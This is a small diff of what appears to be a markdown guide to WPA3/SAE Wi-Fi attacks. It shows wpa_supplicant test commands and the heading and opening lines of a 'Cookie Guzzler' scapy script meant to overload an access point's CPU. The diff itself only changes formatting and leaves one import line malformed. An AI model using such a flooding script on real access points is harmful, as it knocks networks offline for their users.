@@ -78,12 +78,12 @@ network={
 sudo systemctl stop NetworkManager
 sudo wpa_supplicant -c test_sae.conf -i wlo1 - d
 
-## 2. **Cookie Guzzler Attack
+### 2. ****Cookie Guzzler Attack**
 
-🎯 Goal: Overwhelm AP's CPU by triggering anti-clogging mechanism
+🎯 **Goal: Overwhelm AP's CPU by triggering anti-clogging mechanism
 
 🐍 Python Code (cookie_guzzler.py):**
-from scapy.all import *
+from scapy.all import ***
 import random
 
 def rand_mac():
